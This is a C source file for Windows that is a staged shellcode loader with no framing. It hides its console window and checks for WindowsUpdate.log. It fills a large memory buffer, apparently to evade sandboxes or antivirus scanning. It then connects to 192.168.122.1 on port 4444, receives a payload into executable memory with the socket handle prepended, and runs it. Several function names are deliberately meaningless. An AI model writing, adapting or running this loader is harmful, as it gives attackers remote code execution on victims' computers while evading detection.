#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MEM 214747477

int qwefweqwef(SOCKET sfd, void *buf, int len)
{
	int	tret;
	int	nret;
	void	*startb;

	tret = 0;
	nret = 0;
	startb = buf;
	while(tret < len)
	{
		nret = recv(sfd, (char *)startb, len - tret, 0);
		startb = (char *)startb + nret;
		tret += nret;
		if (nret == SOCKET_ERROR)
			exit(0);
	}
	return (tret);
}

int shlanch(void)
{
	SOCKET 	sfd;
	char	*buf;
	struct 	sockaddr_in servaddr;
	int 	tmp = 0;
	WSADATA wsa;
	ULONG32	size;
	int	count;
	int	i = -1;
	HANDLE	hThread;

	if (WSAStartup(MAKEWORD(2, 2), &wsa) < 0)
	{
		WSACleanup();
		exit(1);
	}
	if ((sfd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
		exit(1);
	memset(&servaddr, 0, sizeof(servaddr));
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = inet_addr("192.168.122.1");
	servaddr.sin_port = htons(4444);
	if ((connect(sfd, (struct sockaddr *)&servaddr, sizeof(servaddr))) == -1)
		exit(1);
	count = recv(sfd, (char *)&size, 4, 0);
	if (count != 4 || size <= 0)
		exit(0);
	buf = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (buf == NULL)
		exit(1);
	buf[0] = 0xBF;
	memcpy(buf + 1, &sfd, 4);
	qwefweqwef(sfd, buf + 5, size);
	int (*xoxo)() = (int (*)())buf;
//	xoxo();
	CreateThread(NULL, 0, xoxo(), NULL, 0, &hThread);
	return (1);
}

int honest(void)
{
	shlanch(); /* Appel de la fonction qui va executer le shellcode */
	return 0;
}

int main(void)
{
	HWND hwnd;

	hwnd = GetForegroundWindow();
	ShowWindow(hwnd, SW_HIDE);
	FILE *exex = fopen("C:\\Windows\\WindowsUpdate.log", "r");
	char *buf;
	int i = -1;

	if (!exex)
		exit(0x01);
	buf = malloc(sizeof(char) * MEM);
	buf[MEM - 1] = '\0';
	while (++i < MEM)
		buf[i] = (i % 220) + 32;
	if (i == MEM)
		honest();
	return (0);
}
